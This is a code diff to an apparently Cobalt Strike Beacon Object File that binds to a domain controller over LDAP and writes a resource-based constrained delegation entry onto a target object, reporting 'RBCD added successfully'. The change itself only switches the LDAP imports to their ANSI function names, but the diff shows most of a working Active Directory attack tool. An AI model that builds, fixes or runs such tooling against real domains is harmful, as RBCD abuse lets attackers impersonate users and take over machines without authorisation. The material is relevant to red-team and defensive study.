@@ -3,12 +3,12 @@
 #include "bofdefs.h"
 #include "beacon.h"
 
-WINLDAPAPI LDAP* LDAPAPI WLDAP32$ldap_init(PSTR HostName, ULONG PortNumber);
-WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_set_option(LDAP *ld, int option, void *invalue);
-WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_bind_s(LDAP *ld, PSTR dn, PSTR cred, ULONG method);
-WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_modify_s(LDAP *ld, PSTR dn, LDAPModA *mods[]);
+WINLDAPAPI LDAP* LDAPAPI WLDAP32$ldap_initA(PSTR HostName, ULONG PortNumber);
+WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_set_optionA(LDAP *ld, int option, const void *invalue);
+WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_bind_sA(LDAP *ld, PSTR dn, PSTR cred, ULONG method);
+WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_modify_sA(LDAP *ld, PSTR dn, LDAPModA *mods[]);
 WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_unbind(LDAP *ld);
-WINLDAPAPI PSTR LDAPAPI WLDAP32$ldap_err2string(ULONG err);
+WINLDAPAPI PSTR LDAPAPI WLDAP32$ldap_err2stringA(ULONG err);
 
 DECLSPEC_IMPORT int MSVCRT$sscanf(const char *buffer, const char *format, ...);
 DECLSPEC_IMPORT void* MSVCRT$malloc(size_t size);
@@ -55,22 +55,22 @@ void go(char *args, int len) {
         return;
     }
     
-    ld = WLDAP32$ldap_init(domain, LDAP_PORT);
+    ld = WLDAP32$ldap_initA(domain, LDAP_PORT);
     if (ld == NULL) {
         BeaconPrintf(CALLBACK_ERROR, "LDAP init failed\n");
         if (binary_data) MSVCRT$free(binary_data);
         return;
     }
     
-    result = WLDAP32$ldap_set_option(ld, LDAP_OPT_PROTOCOL_VERSION, &version);
+    result = WLDAP32$ldap_set_optionA(ld, LDAP_OPT_PROTOCOL_VERSION, &version);
     if (result != LDAP_SUCCESS) {
-        BeaconPrintf(CALLBACK_ERROR, "Set version failed: %s\n", WLDAP32$ldap_err2string(result));
+        BeaconPrintf(CALLBACK_ERROR, "Set version failed: %s\n", WLDAP32$ldap_err2stringA(result));
         goto cleanup;
     }
     
-    result = WLDAP32$ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE);
+    result = WLDAP32$ldap_bind_sA(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE);
     if (result != LDAP_SUCCESS) {
-        BeaconPrintf(CALLBACK_ERROR, "Bind failed: %s\n", WLDAP32$ldap_err2string(result));
+        BeaconPrintf(CALLBACK_ERROR, "Bind failed: %s\n", WLDAP32$ldap_err2stringA(result));
         goto cleanup;
     }
     
@@ -87,11 +87,11 @@ void go(char *args, int len) {
     
     LDAPMod *mods[2] = { &mod, NULL };
     
-    result = WLDAP32$ldap_modify_s(ld, target_dn, mods);
+    result = WLDAP32$ldap_modify_sA(ld, target_dn, mods);
     if (result == LDAP_SUCCESS) {
         BeaconPrintf(CALLBACK_OUTPUT, "RBCD added successfully\n");
     } else {
-        BeaconPrintf(CALLBACK_ERROR, "Modify failed: %s\n", WLDAP32$ldap_err2string(result));
+        BeaconPrintf(CALLBACK_ERROR, "Modify failed: %s\n", WLDAP32$ldap_err2stringA(result));
     }
     
 cleanup:
